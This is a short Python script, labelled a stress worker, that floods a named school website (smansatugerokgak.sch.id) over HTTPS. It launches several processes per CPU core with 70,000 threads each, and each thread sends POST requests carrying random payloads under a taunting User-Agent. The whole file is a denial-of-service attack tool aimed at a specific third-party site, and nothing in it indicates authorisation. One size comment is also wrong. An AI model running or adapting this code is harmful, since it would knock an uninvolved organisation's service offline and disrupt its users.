import ssl
import socket
import threading
import multiprocessing
import time
import os

TARGET_HOST = "smansatugerokgak.sch.id"
TARGET_PORT = 443
DURATION = 3  # detik
THREADS_PER_PROC = 70000
PROCESSES = multiprocessing.cpu_count() * 4
PAYLOAD_SIZE = 90 * 1024  # 512KB

def stress_worker(payload_size, duration):
    context = ssl.create_default_context()
    context.minimum_version = ssl.TLSVersion.TLSv1_3
    deadline = time.time() + duration

    def requester():
        while time.time() < deadline:
            try:
                with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=4) as sock:
                    with context.wrap_socket(sock, server_hostname=TARGET_HOST) as ssock:
                        payload = os.urandom(payload_size)
                        req = (
                            b"POST /ultra HTTP/1.1\r\n"
                            b"Host: " + TARGET_HOST.encode() + b"\r\n"
                            b"User-Agent: GOD-ANT-SMITE/999.999\r\n"
                            b"Connection: keep-alive\r\n"
                            b"Content-Length: " + str(len(payload)).encode() + b"\r\n\r\n"
                        ) + payload
                        ssock.sendall(req)
                        try:
                            ssock.recv(1024)
                        except Exception:
                            pass
            except Exception:
                pass

    threads = []
    for _ in range(THREADS_PER_PROC):
        t = threading.Thread(target=requester)
        t.daemon = True
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

if __name__ == "__main__":
    procs = []
    for _ in range(PROCESSES):
        p = multiprocessing.Process(target=stress_worker, args=(PAYLOAD_SIZE, DURATION))
        p.start()
        procs.append(p)
    for p in procs:
        p.join()